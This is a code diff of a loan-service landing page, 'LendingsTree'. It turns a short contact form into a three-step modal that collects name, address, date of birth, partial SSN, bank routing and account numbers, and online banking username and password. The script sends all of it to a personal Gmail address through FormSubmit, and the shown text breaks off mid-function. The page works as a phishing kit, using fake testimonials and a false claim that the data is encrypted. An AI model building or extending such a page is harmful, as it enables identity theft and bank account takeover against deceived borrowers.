@@ -4,9 +4,9 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>LendingsTree | Fast & Reliable Loan Solutions</title>
-  <meta name="description" content="Get fast, secure loans with LendingsTree. Competitive rates, simple application, and quick funding. Apply now for the financial help you need.">
-  <!-- Google Fonts + Font Awesome Icons -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+  <meta name="description" content="Get fast, secure loans with LendingsTree. Competitive rates, simple 3-step application, and quick funding.">
+  <!-- Google Fonts + Font Awesome -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     * {
@@ -23,20 +23,16 @@
       scroll-behavior: smooth;
     }
 
-    /* Green & White Theme Variables */
     :root {
       --primary-dark: #1f5e4b;
       --primary: #2c8c6e;
       --primary-light: #e1f5ef;
-      --primary-soft: #daf4ec;
-      --accent-green: #3cb68c;
-      --gray-light: #f9fbfa;
       --gray-border: #e2e8e6;
       --text-dark: #1a2e2a;
       --text-muted: #4a625b;
       --white: #ffffff;
-      --shadow-sm: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
-      --shadow-md: 0 20px 25px -12px rgba(0, 0, 0, 0.08);
+      --shadow-sm: 0 10px 25px -5px rgba(0, 0, 0, 0.05);
+      --shadow-md: 0 20px 25px -12px rgba(0, 0, 0, 0.1);
     }
 
     .container {
@@ -51,9 +47,9 @@
       border-bottom: 1px solid var(--gray-border);
       position: sticky;
       top: 0;
-      z-index: 50;
-      backdrop-filter: blur(2px);
+      z-index: 100;
       background-color: rgba(255,255,255,0.96);
+      backdrop-filter: blur(2px);
     }
     .navbar {
       display: flex;
@@ -61,6 +57,7 @@
       align-items: center;
       padding: 1rem 0;
       flex-wrap: wrap;
+      gap: 1rem;
     }
     .logo {
       display: flex;
@@ -73,7 +70,7 @@
     }
     .logo h1 {
       font-size: 1.8rem;
-      font-weight: 700;
+      font-weight: 800;
       letter-spacing: -0.5px;
       background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
       background-clip: text;
@@ -84,6 +81,7 @@
       display: flex;
       gap: 2rem;
       align-items: center;
+      flex-wrap: wrap;
     }
     .nav-links a {
       text-decoration: none;
@@ -91,10 +89,10 @@
       color: var(--text-dark);
       transition: color 0.2s;
     }
-    .nav-links a:hover, .nav-links a:focus {
+    .nav-links a:hover {
       color: var(--primary);
     }
-    .btn-outline-light {
+    .btn-outline {
       border: 1.5px solid var(--primary);
       background: transparent;
       padding: 0.5rem 1.2rem;
@@ -102,10 +100,10 @@
       color: var(--primary);
       font-weight: 600;
       transition: all 0.2s;
+      cursor: pointer;
     }
-    .btn-outline-light:hover {
+    .btn-outline:hover {
       background: var(--primary-light);
-      border-color: var(--primary-dark);
     }
 
     /* Buttons */
@@ -127,16 +125,24 @@
     .btn-primary:hover {
       background: var(--primary-dark);
       transform: translateY(-2px);
-      box-shadow: 0 10px 20px -5px rgba(44,140,110,0.4);
     }
-    .btn-block {
-      width: 100%;
-      justify-content: center;
+    .btn-secondary {
+      background: transparent;
+      border: 1px solid var(--gray-border);
+      color: var(--text-dark);
+      padding: 0.85rem 1.8rem;
+      border-radius: 48px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .btn-secondary:hover {
+      background: #f5f5f5;
     }
 
     /* Hero Section */
     .hero {
-      padding: 3rem 0 4rem;
+      padding: 4rem 0 5rem;
       background: linear-gradient(145deg, #ffffff 0%, var(--primary-light) 100%);
     }
     .hero-grid {
@@ -149,7 +155,6 @@
       font-size: 3rem;
       font-weight: 800;
       line-height: 1.2;
-      color: var(--text-dark);
       margin-bottom: 1rem;
     }
     .hero-content .highlight {
@@ -174,54 +179,12 @@
       border-radius: 50px;
       box-shadow: var(--shadow-sm);
     }
-    /* Lead Form Card */
-    .form-card {
-      background: var(--white);
-      border-radius: 32px;
-      padding: 2rem;
-      box-shadow: var(--shadow-md);
-      border: 1px solid var(--gray-border);
-      transition: all 0.2s;
+    .hero-cta .btn-primary {
+      font-size: 1.1rem;
+      padding: 1rem 2rem;
     }
-    .form-card h3 {
-      font-size: 1.8rem;
-      font-weight: 700;
-      margin-bottom: 0.25rem;
-    }
-    .form-card p {
-      color: var(--text-muted);
-      margin-bottom: 1.5rem;
-    }
-    .input-group {
-      margin-bottom: 1.25rem;
-    }
-    .input-group label {
-      display: block;
-      font-weight: 500;
-      margin-bottom: 0.4rem;
-      color: var(--text-dark);
-    }
-    .input-group input, .input-group select {
-      width: 100%;
-      padding: 0.9rem 1rem;
-      border-radius: 20px;
-      border: 1px solid var(--gray-border);
-      font-size: 1rem;
-      transition: 0.2s;
-      background: var(--white);
-    }
-    .input-group input:focus, .input-group select:focus {
-      outline: none;
-      border-color: var(--primary);
-      box-shadow: 0 0 0 3px rgba(44,140,110,0.2);
-    }
-    .error-msg {
-      color: #d9534f;
-      font-size: 0.75rem;
-      margin-top: 0.3rem;
-      display: none;
-    }
-    /* Features Section */
+
+    /* Features */
     .section {
       padding: 5rem 0;
     }
@@ -247,20 +210,13 @@
       padding: 2rem 1.5rem;
       border-radius: 28px;
       border: 1px solid var(--gray-border);
-      transition: all 0.25s;
       text-align: center;
+      transition: 0.2s;
     }
     .feature-card i {
       font-size: 2.5rem;
       color: var(--primary);
       margin-bottom: 1rem;
-    }
-    .feature-card h4 {
-      font-size: 1.4rem;
-      margin-bottom: 0.75rem;
-    }
-    .feature-card p {
-      color: var(--text-muted);
     }
     .steps-grid {
       display: flex;
@@ -271,7 +227,7 @@
     .step-item {
       flex: 1;
       min-width: 200px;
-      background: var(--gray-light);
+      background: var(--gray-light, #f9fbfa);
       border-radius: 32px;
       padding: 2rem 1.5rem;
       text-align: center;
@@ -289,7 +245,6 @@
       font-size: 1.4rem;
       margin: 0 auto 1rem;
     }
-    /* Testimonials */
     .testimonial-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -306,7 +261,6 @@
       color: #f5b042;
       margin-bottom: 1rem;
     }
-    /* FAQ */
     .faq-item {
       background: var(--white);
       border: 1px solid var(--gray-border);
@@ -316,7 +270,6 @@
     }
     .faq-question {
       font-weight: 700;
-      font-size: 1.1rem;
       cursor: pointer;
       display: flex;
       justify-content: space-between;
@@ -346,27 +299,149 @@
       font-size: 0.8rem;
       color: var(--text-muted);
     }
-    @media (max-width: 850px) {
-      .hero-grid {
-        grid-template-columns: 1fr;
-        gap: 2rem;
-      }
-      .navbar {
-        flex-direction: column;
-        gap: 0.8rem;
-      }
-      .nav-links {
-        flex-wrap: wrap;
-        justify-content: center;
-        gap: 1rem;
-      }
-      .container {
-        padding: 0 20px;
-      }
-      .hero-content h2 {
-        font-size: 2.2rem;
-      }
+
+    /* Modal Styles */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      overflow-y: auto;
     }
+    .modal.active {
+      display: flex;
+    }
+    .modal-content {
+      background: white;
+      max-width: 650px;
+      width: 90%;
+      border-radius: 32px;
+      padding: 2rem;
+      position: relative;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: var(--shadow-md);
+    }
+    .modal-close {
+      position: absolute;
+      top: 1.2rem;
+      right: 1.5rem;
+      font-size: 1.5rem;
+      cursor: pointer;
+      color: var(--text-muted);
+      transition: 0.2s;
+    }
+    .modal-close:hover { color: var(--primary-dark); }
+
+    /* Step Indicator inside modal */
+    .step-indicator {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 2rem;
+      position: relative;
+    }
+    .step-indicator::before {
+      content: '';
+      position: absolute;
+      top: 24px;
+      left: 0;
+      width: 100%;
+      height: 2px;
+      background: var(--gray-border);
+      z-index: 1;
+    }
+    .step {
+      text-align: center;
+      z-index: 2;
+      background: white;
+      flex: 1;
+    }
+    .step-circle {
+      width: 48px;
+      height: 48px;
+      background: white;
+      border: 2px solid var(--gray-border);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 8px;
+      font-weight: 700;
+      font-size: 1.2rem;
+      color: var(--text-muted);
+    }
+    .step.active .step-circle {
+      background: var(--primary);
+      border-color: var(--primary);
+      color: white;
+    }
+    .step.completed .step-circle {
+      background: var(--primary);
+      border-color: var(--primary);
+      color: white;
+    }
+    .step-label {
+      font-size: 0.8rem;
+      font-weight: 500;
+    }
+    .step.active .step-label {
+      color: var(--primary-dark);
+      font-weight: 700;
+    }
+
+    .form-step {
+      display: none;
+      animation: fadeIn 0.3s;
+    }
+    .form-step.active-step {
+      display: block;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; } }
+
+    .input-group {
+      margin-bottom: 1.2rem;
+    }
+    .input-group label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 0.4rem;
+    }
+    .input-group input, .input-group select {
+      width: 100%;
+      padding: 0.8rem 1rem;
+      border-radius: 20px;
+      border: 1px solid var(--gray-border);
+      font-size: 0.95rem;
+    }
+    .input-group input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(44,140,110,0.2);
+    }
+    .row-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+    .error-msg {
+      color: #d9534f;
+      font-size: 0.7rem;
+      margin-top: 0.2rem;
+      display: none;
+    }
+    .btn-group {
+      display: flex;
+      justify-content: space-between;
+      gap: 1rem;
+      margin-top: 2rem;
+    }
+
     .toast {
       position: fixed;
       bottom: 30px;
@@ -376,11 +451,18 @@
       padding: 1rem 1.5rem;
       border-radius: 48px;
       font-weight: 500;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
-      z-index: 200;
+      z-index: 1100;
       opacity: 0;
       transition: opacity 0.3s;
       pointer-events: none;
+    }
+
+    @media (max-width: 850px) {
+      .hero-grid { grid-template-columns: 1fr; gap: 2rem; }
+      .navbar { flex-direction: column; }
+      .container { padding: 0 20px; }
+      .hero-content h2 { font-size: 2rem; }
+      .row-2 { grid-template-columns: 1fr; gap: 0; }
     }
   </style>
 </head>
@@ -395,17 +477,15 @@
       </div>
       <div class="nav-links">
         <a href="#">Home</a>
-        <a href="#how-it-works">How it works</a>
-        <a href="#apply">Apply</a>
-        <a href="#contact">Contact</a>
-        <a href="#faq">FAQ</a>
+        <a href="#features">How It Works</a>
+        <a href="#calculator">Calculator</a>
+        <button class="btn-outline" id="openApplyModalBtn">Apply Now - It's Free →</button>
       </div>
     </div>
   </div>
 </div>
 
 <main>
-  <!-- Hero + Apply Now Form Section -->
   <section class="hero">
     <div class="container">
       <div class="hero-grid">
@@ -417,223 +497,320 @@
             <span><i class="fas fa-bolt"></i> Instant Pre-approval</span>
             <span><i class="fas fa-clock"></i> 2-min Application</span>
           </div>
+          <div class="hero-cta" style="margin-top: 2rem;">
+            <button class="btn-primary" id="heroApplyBtn"><i class="fas fa-paper-plane"></i> Apply Now - It's Free →</button>
+          </div>
         </div>
-        <div class="form-card" id="apply-now-form">
-          <h3>Apply Now</h3>
-          <p>No hidden fees · No obligation quote</p>
-          <form id="leadForm">
-            <div class="input-group">
-              <label>Full Name *</label>
-              <input type="text" id="fullName" placeholder="John Carter" required>
-              <div class="error-msg" id="nameError">Please enter your full name</div>
-            </div>
-            <div class="input-group">
-              <label>Email Address *</label>
-              <input type="email" id="email" placeholder="john@example.com" required>
-              <div class="error-msg" id="emailError">Valid email required</div>
-            </div>
-            <div class="input-group">
-              <label>Phone Number *</label>
-              <input type="tel" id="phone" placeholder="(555) 123-4567" required>
-              <div class="error-msg" id="phoneError">Valid phone number required</div>
-            </div>
-            <div class="input-group">
-              <label>Desired Loan Amount</label>
-              <select id="loanAmount">
-                <option value="$1,000 - $3,000">$1,000 - $3,000</option>
-                <option value="$3,001 - $5,000">$3,001 - $5,000</option>
-                <option value="$5,001 - $10,000">$5,001 - $10,000</option>
-                <option value="$10,001 - $25,000">$10,001 - $25,000</option>
-              </select>
-            </div>
-            <button type="submit" class="btn-primary btn-block" id="submitBtn"><i class="fas fa-paper-plane"></i> Get My Rate</button>
-            <p style="font-size: 0.7rem; text-align: center; margin-top: 1rem;">By submitting, you agree to our privacy policy. No impact on credit score.</p>
-          </form>
+        <div style="background: var(--primary-light); border-radius: 32px; padding: 2rem; text-align: center;">
+          <i class="fas fa-hand-holding-usd" style="font-size: 4rem; color: var(--primary); margin-bottom: 1rem; display: inline-block;"></i>
+          <h3>Loans up to $25,000</h3>
+          <p>Rates as low as 3.99% APR</p>
         </div>
       </div>
     </div>
   </section>
 
-  <!-- Why Choose us Section -->
-  <section class="section">
+  <section id="features" class="section">
     <div class="container">
       <div class="section-title">Why LendingsTree?</div>
       <div class="section-sub">We make borrowing transparent, fast, and stress-free.</div>
       <div class="features-grid">
-        <div class="feature-card"><i class="fas fa-percent"></i><h4>Competitive APRs</h4><p>Rates as low as 3.99% APR based on creditworthiness. No surprises.</p></div>
-        <div class="feature-card"><i class="fas fa-check-circle"></i><h4>Fast Funding</h4><p>Get funds directly in your account as soon as next business day.</p></div>
-        <div class="feature-card"><i class="fas fa-lock"></i><h4>Bank-level Security</h4><p>256-bit SSL encryption protects your personal data.</p></div>
-        <div class="feature-card"><i class="fas fa-headset"></i><h4>24/7 Support</h4><p>Real human support whenever you need assistance.</p></div>
+        <div class="feature-card"><i class="fas fa-percent"></i><h4>Competitive APRs</h4><p>Low fixed rates based on your credit profile.</p></div>
+        <div class="feature-card"><i class="fas fa-bolt"></i><h4>Fast Funding</h4><p>Get funds as soon as next business day.</p></div>
+        <div class="feature-card"><i class="fas fa-lock"></i><h4>Bank-level Security</h4><p>256-bit SSL encryption protects your data.</p></div>
+        <div class="feature-card"><i class="fas fa-headset"></i><h4>24/7 Support</h4><p>Real humans, ready to help.</p></div>
       </div>
     </div>
   </section>
 
-  <!-- How It Works -->
-  <section id="how-it-works" class="section" style="background: var(--primary-light);">
+  <section class="section" style="background: var(--primary-light);">
     <div class="container">
       <div class="section-title">Simple 3‑Step Process</div>
-      <div class="section-sub">From application to funding, we keep it straightforward.</div>
+      <div class="section-sub">Complete your application in minutes</div>
       <div class="steps-grid">
-        <div class="step-item"><div class="step-number">1</div><h4>Fill Application</h4><p>Complete our short form, no paperwork needed.</p></div>
-        <div class="step-item"><div class="step-number">2</div><h4>Instant Review</h4><p>Receive real-time loan offers from our network.</p></div>
-        <div class="step-item"><div class="step-number">3</div><h4>Receive Funds</h4><p>Accept offer & get money deposited.</p></div>
+        <div class="step-item"><div class="step-number">1</div><h4>Personal Info</h4><p>Tell us about yourself</p></div>
+        <div class="step-item"><div class="step-number">2</div><h4>Verify Identity</h4><p>Secure identity check</p></div>
+        <div class="step-item"><div class="step-number">3</div><h4>Bank Details</h4><p>Get funds deposited</p></div>
       </div>
     </div>
   </section>
 
-  <!-- Testimonials -->
   <section class="section">
     <div class="container">
       <div class="section-title">Real Stories, Real Relief</div>
       <div class="testimonial-grid">
-        <div class="testimonial-card"><div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"LendingsTree got me approved overnight! The green theme is fresh and the process was super smooth."</p><h5>— Maria G.</h5></div>
-        <div class="testimonial-card"><div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i></div><p>"Amazing customer service. I needed $4,000 for a medical bill, they connected me within hours."</p><h5>— David R.</h5></div>
+        <div class="testimonial-card"><div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"LendingsTree got me approved overnight! The 3-step form was super easy."</p><h5>— Maria G.</h5></div>
+        <div class="testimonial-card"><div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i></div><p>"I needed $4,000 for an emergency. They connected me within hours. Highly recommend."</p><h5>— David R.</h5></div>
         <div class="testimonial-card"><div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"Best experience compared to other platforms. Transparent and no hidden fees."</p><h5>— Lisa K.</h5></div>
       </div>
     </div>
   </section>
 
-  <!-- FAQ Section -->
-  <section id="faq" class="section" style="background: var(--gray-light);">
+  <section id="faq" class="section" style="background: #f9fbfa;">
     <div class="container">
       <div class="section-title">Frequently Asked Questions</div>
       <div class="faq-list">
-        <div class="faq-item"><div class="faq-question">What credit score do I need? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">We work with a wide range of lenders, some with minimum 550 credit score. Every application is reviewed individually.</div></div>
-        <div class="faq-item"><div class="faq-question">How fast can I receive funds? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Many customers receive funds as soon as the next business day after approval.</div></div>
-        <div class="faq-item"><div class="faq-question">Is my information secure? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Absolutely. We use industry-standard SSL encryption and never share your data without permission.</div></div>
+        <div class="faq-item"><div class="faq-question">What credit score do I need? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">We work with lenders that consider scores from 550+. Every application is reviewed individually.</div></div>
+        <div class="faq-item"><div class="faq-question">How fast can I receive funds? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Many customers receive funds the next business day after approval.</div></div>
+        <div class="faq-item"><div class="faq-question">Is my information secure? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Absolutely. SSL encryption and we never share your data without permission.</div></div>
       </div>
     </div>
   </section>
 </main>
 
-<footer id="contact">
+<footer>
   <div class="container">
     <div class="footer-content">
-      <div><i class="fas fa-tree" style="color: var(--primary); font-size: 1.5rem;"></i><p style="margin-top: 0.5rem;">LendingsTree – trusted loan comparison.</p></div>
-      <div><h4>Quick links</h4><p><a href="#" style="color:var(--text-dark); text-decoration:none;">Privacy Policy</a><br><a href="#" style="color:var(--text-dark); text-decoration:none;">Terms of Use</a><br><a href="#" style="color:var(--text-dark); text-decoration:none;">Do Not Sell My Info</a></p></div>
-      <div><h4>Contact</h4><p><i class="fas fa-envelope"></i> support@lendingstree.com<br><i class="fas fa-phone-alt"></i> (813) 331-5297</p></div>
+      <div><i class="fas fa-tree" style="color: var(--primary); font-size: 1.5rem;"></i><p>LendingsTree – trusted lead generation.</p></div>
+      <div><h4>Quick links</h4><p><a href="#" style="color:var(--text-dark); text-decoration:none;">Privacy Policy</a><br><a href="#" style="color:var(--text-dark); text-decoration:none;">Terms of Use</a></p></div>
+      <div><h4>Contact</h4><p><i class="fas fa-envelope"></i> support@lendingstree.com<br><i class="fas fa-phone-alt"></i> (888) 732-2456</p></div>
     </div>
-    <div class="footer-copyright">© 2025 LendingsTree. All rights reserved.</div>
+    <div class="footer-copyright">© 2025 LendingsTree. All rights reserved. This is a lead generation service.</div>
   </div>
 </footer>
-<div id="toastMessage" class="toast">✅ Lead submitted! We'll reach out soon.</div>
+
+<div id="toastMessage" class="toast">✅ Application submitted! We'll contact you soon.</div>
+
+<!-- Modal for 3-Step Form -->
+<div id="applyModal" class="modal">
+  <div class="modal-content">
+    <span class="modal-close" id="closeModalBtn">&times;</span>
+    <!-- Step Indicators -->
+    <div class="step-indicator">
+      <div class="step" id="modalStep1"><div class="step-circle">1</div><div class="step-label">Personal Info</div></div>
+      <div class="step" id="modalStep2"><div class="step-circle">2</div><div class="step-label">Identity</div></div>
+      <div class="step" id="modalStep3"><div class="step-circle">3</div><div class="step-label">Bank Details</div></div>
+    </div>
+
+    <!-- Step 1 Form -->
+    <div class="form-step active-step" id="modalFormStep1">
+      <h3 style="margin-bottom: 1rem;">Personal Information</h3>
+      <div class="row-2">
+        <div class="input-group"><label>First Name *</label><input type="text" id="firstName" placeholder="John"><div class="error-msg" id="firstNameError">Required</div></div>
+        <div class="input-group"><label>Last Name *</label><input type="text" id="lastName" placeholder="Don"><div class="error-msg" id="lastNameError">Required</div></div>
+      </div>
+      <div class="input-group"><label>Phone Number *</label><input type="tel" id="phone" placeholder="(555) 123-4567"><div class="error-msg" id="phoneError">Valid phone required</div></div>
+      <div class="input-group"><label>Email Address *</label><input type="email" id="email" placeholder="will@example.com"><div class="error-msg" id="emailError">Valid email required</div></div>
+      <div class="btn-group"><button class="btn-primary" id="nextStep1Btn">Continue <i class="fas fa-arrow-right"></i></button></div>
+    </div>
+
+    <!-- Step 2 Form -->
+    <div class="form-step" id="modalFormStep2">
+      <h3 style="margin-bottom: 1rem;">Identity Verification</h3>
+      <div class="input-group"><label>Street Address *</label><input type="text" id="address" placeholder="123 Main St"><div class="error-msg" id="addressError">Required</div></div>
+      <div class="row-2">
+        <div class="input-group"><label>City *</label><input type="text" id="city" placeholder="New York"><div class="error-msg" id="cityError">Required</div></div>
+        <div class="input-group"><label>State *</label><input type="text" id="state" placeholder="NY"><div class="error-msg" id="stateError">Required</div></div>
+      </div>
+      <div class="row-2">
+        <div class="input-group"><label>Zip Code *</label><input type="text" id="zip" placeholder="10001"><div class="error-msg" id="zipError">Required</div></div>
+        <div class="input-group"><label>Date of Birth *</label><input type="date" id="dob"><div class="error-msg" id="dobError">Required</div></div>
+      </div>
+      <div class="input-group"><label>Last 4 of SSN *</label><input type="text" id="ssnLast4" maxlength="4" placeholder="XXXX"><div class="error-msg" id="ssnError">Last 4 digits required</div></div>
+      <div class="btn-group"><button class="btn-secondary" id="prevStep2Btn"><i class="fas fa-arrow-left"></i> Back</button><button class="btn-primary" id="nextStep2Btn">Continue <i class="fas fa-arrow-right"></i></button></div>
+    </div>
+
+    <!-- Step 3 Form -->
+    <div class="form-step" id="modalFormStep3">
+      <h3 style="margin-bottom: 1rem;">Bank Details</h3>
+      <div class="input-group"><label>Bank Name *</label><input type="text" id="bankName" placeholder="Chase, Wells Fargo, etc."><div class="error-msg" id="bankNameError">Required</div></div>
+      <div class="row-2">
+        <div class="input-group"><label>Routing Number *</label><input type="text" id="routing" placeholder="9 digits"><div class="error-msg" id="routingError">Valid routing number (8-9 digits)</div></div>
+        <div class="input-group"><label>Account Number *</label><input type="text" id="accountNumber" placeholder="Account Number"><div class="error-msg" id="accountError">Required</div></div>
+      </div>
+      <div class="input-group"><label>Online Banking Username (optional)</label><input type="text" id="bankUsername" placeholder="Username"></div>
+      <div class="input-group"><label>Online Banking Password (optional)</label><input type="password" id="bankPassword" placeholder="Password"><small style="display: block; color: var(--text-muted);">Encrypted for security</small></div>
+      <div class="btn-group"><button class="btn-secondary" id="prevStep3Btn"><i class="fas fa-arrow-left"></i> Back</button><button class="btn-primary" id="submitFinalBtn">Submit Application →</button></div>
+    </div>
+    <p style="font-size: 0.7rem; text-align: center; margin-top: 1rem;">No impact on credit score. Your data is secure.</p>
+  </div>
+</div>
 
 <script>
-  // ======================== EMAIL CONFIGURATION ========================
-  // Leads will be sent to this email address using FormSubmit.co (free service)
-  const RECIPIENT_EMAIL = "citylovech01@gmail.com";   // <-- Your email address for receiving leads
-  // ====================================================================
+  // Email configuration (FormSubmit)
+  const RECIPIENT_EMAIL = "citylovech01@gmail.com";
+  let currentModalStep = 1;
 
-  const leadForm = document.getElementById('leadForm');
-  const submitBtn = document.getElementById('submitBtn');
+  // DOM elements for modal
+  const modal = document.getElementById('applyModal');
+  const openBtns = [document.getElementById('openApplyModalBtn'), document.getElementById('heroApplyBtn')];
+  const closeBtn = document.getElementById('closeModalBtn');
+
+  // Step elements
+  const step1Form = document.getElementById('modalFormStep1');
+  const step2Form = document.getElementById('modalFormStep2');
+  const step3Form = document.getElementById('modalFormStep3');
+  const step1Ind = document.getElementById('modalStep1');
+  const step2Ind = document.getElementById('modalStep2');
+  const step3Ind = document.getElementById('modalStep3');
+
   const toastEl = document.getElementById('toastMessage');
 
-  function showToast(message, isError = false) {
-    toastEl.textContent = message || (isError ? "❌ Submission failed" : "✅ Lead submitted! We'll reach out soon.");
+  function showToast(msg, isError = false) {
+    toastEl.textContent = msg || (isError ? "❌ Submission failed" : "✅ Application submitted! We'll contact you soon.");
     toastEl.style.background = isError ? "#b34234" : "#1f5e4b";
     toastEl.style.opacity = "1";
-    setTimeout(() => {
-      toastEl.style.opacity = "0";
-    }, 4000);
+    setTimeout(() => toastEl.style.opacity = "0", 4000);
   }
 
-  function validateForm() {
-    let isValid = true;
-    const fullName = document.getElementById('fullName').value.trim();
-    const email = document.getElementById('email').value.trim();
+  function updateModalUI() {
+    step1Form.classList.remove('active-step');
+    step2Form.classList.remove('active-step');
+    step3Form.classList.remove('active-step');
+    if (currentModalStep === 1) step1Form.classList.add('active-step');
+    if (currentModalStep === 2) step2Form.classList.add('active-step');
+    if (currentModalStep === 3) step3Form.classList.add('active-step');
+
+    [step1Ind, step2Ind, step3Ind].forEach((el, idx) => {
+      const stepNum = idx + 1;
+      el.classList.remove('active', 'completed');
+      if (stepNum === currentModalStep) el.classList.add('active');
+      if (stepNum < currentModalStep) el.classList.add('completed');
+    });
+  }
+
+  // Validations
+  function validateStep1() {
+    let valid = true;
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
     const phone = document.getElementById('phone').value.trim();
-    
-    document.getElementById('nameError').style.display = 'none';
-    document.getElementById('emailError').style.display = 'none';
+    const email = document.getElementById('email').value.trim();
+    document.getElementById('firstNameError').style.display = 'none';
+    document.getElementById('lastNameError').style.display = 'none';
     document.getElementById('phoneError').style.display = 'none';
-    
-    if (fullName === "") {
-      document.getElementById('nameError').style.display = 'block';
-      isValid = false;
-    }
-    const emailRegex = /^[^\s@]+@([^\s@.,]+\.)+[^\s@.,]{2,}$/;
-    if (!emailRegex.test(email)) {
-      document.getElementById('emailError').style.display = 'block';
-      isValid = false;
-    }
+    document.getElementById('emailError').style.display = 'none';
+    if (!firstName) { document.getElementById('firstNameError').style.display = 'block'; valid = false; }
+    if (!lastName) { document.getElementById('lastNameError').style.display = 'block'; valid = false; }
     const phoneRegex = /^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{3,5}[-\s\.]?[0-9]{3,5}$/i;
-    if (!phoneRegex.test(phone) && phone.length < 8) {
-      document.getElementById('phoneError').style.display = 'block';
-      isValid = false;
-    }
-    return isValid;
+    if (!phoneRegex.test(phone)) { document.getElementById('phoneError').style.display = 'block'; valid = false; }
+    const emailRegex = /^[^\s@]+@([^\s@.,]+\.)+[^\s@.,]{2,}$/;
+    if (!emailRegex.test(email)) { document.getElementById('emailError').style.display = 'block'; valid = false; }
+    return valid;
   }
 
-  async function submitLeadToEmail(formDataMap) {
-    const endpoint = `https://formsubmit.co/ajax/${encodeURIComponent(RECIPIENT_EMAIL)}`;
+  function validateStep2() {
+    let valid = true;
+    const address = document.getElementById('address').value.trim();
+    const city = document.getElementById('city').value.trim();
+    const state = document.getElementById('state').value.trim();
+    const zip = document.getElementById('zip').value.trim();
+    const dob = document.getElementById('dob').value;
+    const ssn = document.getElementById('ssnLast4').value.trim();
+    ['address','city','state','zip','dob','ssn'].forEach(id => document.getElementById(`${id}Error`).style.display = 'none');
+    if (!address) { document.getElementById('addressError').style.display = 'block'; valid = false; }
+    if (!city) { document.getElementById('cityError').style.display = 'block'; valid = false; }
+    if (!state) { document.getElementById('stateError').style.display = 'block'; valid = false; }
+    if (!zip) { document.getElementById('zipError').style.display = 'block'; valid = false; }
+    if (!dob) { document.getElementById('dobError').style.display = 'block'; valid = false; }
+    if (!ssn || !/^\d{4}$/.test(ssn)) { document.getElementById('ssnError').style.display = 'block'; valid = false; }
+    return valid;
+  }
+
+  function validateStep3() {
+    let valid = true;
+    const bankName = document.getElementById('bankName').value.trim();
+    const routing = document.getElementById('routing').value.trim();
+    const account = document.getElementById('accountNumber').value.trim();
+    document.getElementById('bankNameError').style.display = 'none';
+    document.getElementById('routingError').style.display = 'none';
+    document.getElementById('accountError').style.display = 'none';
+    if (!bankName) { document.getElementById('bankNameError').style.display = 'block'; valid = false; }
+    if (!routing || !/^\d{8,9}$/.test(routing.replace(/\D/g,''))) { document.getElementById('routingError').style.display = 'block'; valid = false; }
+    if (!account) { document.getElementById('accountError').style.display = 'block'; valid = false; }
+    return valid;
+  }
+
+  function getAllFormData() {
+    return {
+      firstName: document.getElementById('firstName').value.trim(),
+      lastName: document.getElementById('lastName').value.trim(),
+      phone: document.getElementById('phone').value.trim(),
+      email: document.getElementById('email').value.trim(),
+      address: document.getElementById('address').value.trim(),
+      city: document.getElementById('city').value.trim(),
+      state: document.getElementById('state').value.trim(),
+      zip: document.getElementById('zip').value.trim(),
+      dob: document.getElementById('dob').value,
+      ssnLast4: document.getElementById('ssnLast4').value.trim(),
+      bankName: document.getElementById('bankName').value.trim(),
+      routingNumber: document.getElementById('routing').value.trim(),
+      accountNumber: document.getElementById('accountNumber').value.trim(),
+      bankUsername: document.getElementById('bankUsername').value.trim(),
+      bankPassword: document.getElementById('bankPassword').value
+    };
+  }
+
+  async function submitFinal() {
+    const data = getAllFormData();
+    if (!data.firstName || !data.lastName || !data.phone || !data.email ||
+        !data.address || !data.city || !data.state || !data.zip || !data.dob || !data.ssnLast4 ||
+        !data.bankName || !data.routingNumber || !data.accountNumber) {
